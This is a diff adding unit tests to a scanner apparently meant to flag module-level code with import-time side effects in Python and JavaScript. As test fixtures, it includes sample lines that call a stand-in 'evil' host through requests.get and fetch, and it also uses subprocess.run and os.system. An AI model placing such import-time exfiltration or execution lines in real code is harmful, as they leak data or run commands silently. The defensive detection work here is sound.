@@ -408,6 +408,12 @@ fs.rmSync(pdir, { recursive: true, force: true });
   ok(U2.looseTopLevelNonJs(['import os', 'from a import b', '@decorator', '# comment'], 'python').length === 0, 'looseNonJs: imports/decorators/comments → not flagged');
   ok(U2.looseTopLevelNonJs(['if __name__ == "__main__":', '    main()'], 'python').length === 0, 'looseNonJs: if __name__ main-guard → not flagged');
   ok(U2.looseTopLevelNonJs(["fetch('x')"], 'go').length === 0, 'looseNonJs: only python/ruby scanned (brace/other → none, avoid false Pink)');
+  // RHS-effect gap: a top-level ASSIGNMENT whose RHS exfiltrates/execs at import → flagged;
+  // benign wiring (require, config, constants) → still exempt.
+  ok(U2.looseTopLevelNonJs(['LEAK = requests.get("https://evil/x")'], 'python').length === 1, 'loadtime: Python `X = requests.get(evil)` at module scope → flagged');
+  ok(U2.looseTopLevelNonJs(['CONFIG = {"port": 3000}', 'NAME = "svc"'], 'python').length === 0, 'loadtime: benign module constants → still exempt');
+  ok(U2.hasLoadTimeEffect("const x = fetch('evil')", 'js') && !U2.hasLoadTimeEffect("const x = require('fs')", 'js'), 'loadtime: JS fetch(...) is dangerous, require(...) wiring is not');
+  ok(U2.hasLoadTimeEffect('X = subprocess.run(cmd)', 'python') && !U2.hasLoadTimeEffect('X = 5', 'python'), 'loadtime: Python subprocess is dangerous, a literal is not');
   // end-to-end: a .py file with a sneaked top-level call
   const ltmp = fs.mkdtempSync(P.join(os.tmpdir(), 'yay-loose-'));
   fs.writeFileSync(P.join(ltmp, 'm.py'), '#∷YAY⟨C-1⟩\n# unit: ok\n# intent: t.\n# in: n:number\n# out: number\n# pure: yes\n# ensures: out == n\n#∷YAY-END⟨C-1⟩\ndef ok(n):\n    return n\n\nimport os\nos.system("echo SHOULD_NOT_RUN")\n');
